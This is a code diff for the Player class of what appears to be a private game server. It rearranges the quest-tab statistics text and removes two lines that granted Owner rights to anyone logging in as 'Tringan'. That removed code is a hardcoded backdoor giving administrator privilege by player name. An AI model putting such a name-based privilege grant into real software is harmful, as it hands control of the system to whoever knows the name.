@@ -753,25 +753,19 @@ public class Player {
 	}
 
 	public void questTab() {
-		String[][] ranks = { { "0", "Member" }, { "1", "Moderator" }, { "2", "Administrator" }, { "3", "Owner" },
-				{ "7", "Gfx Designer" }, { "8", "Developer" } };
-		getPA().sendFrame126("Incendius", 19155);
-		getPA().sendFrame126("-- Player statistics --", 19161);
+		getPA().sendFrame126("Player Statistics", 19155);
+		getPA().sendFrame126("-- PVP --", 19161);
 		getPA().sendFrame126("", 19162);
 		getPA().sendFrame126("Kills:", 19163);
 		getPA().sendFrame126("" + KC, 19164);
 		getPA().sendFrame126("Deaths:", 663);
 		getPA().sendFrame126("" + DC, 16026);
-		getPA().sendFrame126("Pk Points: " + pkp, 16027);
-		getPA().sendFrame126("Vote Points: " + votingPoints, 16028);
-		getPA().sendFrame126("Slayer Points: " + SlayerPoints, 16029);
-		for (String[] i : ranks) {
-			if (Integer.parseInt(i[0]) == playerRights) {
-				getPA().sendFrame126("Player Rank: " + i[1], 16030);
-				break;
-			}
-		}
-		for (int i = 16031; i < 16126; i++)
+		getPA().sendFrame126("PK Points: " + pkp, 16027);
+		getPA().sendFrame126("", 16028);
+		getPA().sendFrame126("Vote Points: " + votingPoints, 16029);
+		getPA().sendFrame126("Slayer Points: " + SlayerPoints, 16030);
+
+		for (int i = 16032; i < 16126; i++)
 			getPA().sendFrame126("", i);
 	}
 
@@ -806,8 +800,7 @@ public class Player {
 			getPA().sendFrame36(502, 1);
 			getPA().sendFrame36(287, 1);
 		}
-		if (c.playerName == "Tringan")
-			c.playerRights = 3;
+
 		getPA().setConfig(173, isRunning ? 0 : 1);
 		questTab();
 		isFullHelm = ItemLoader.isFullHelm(playerEquipment[playerHat]);
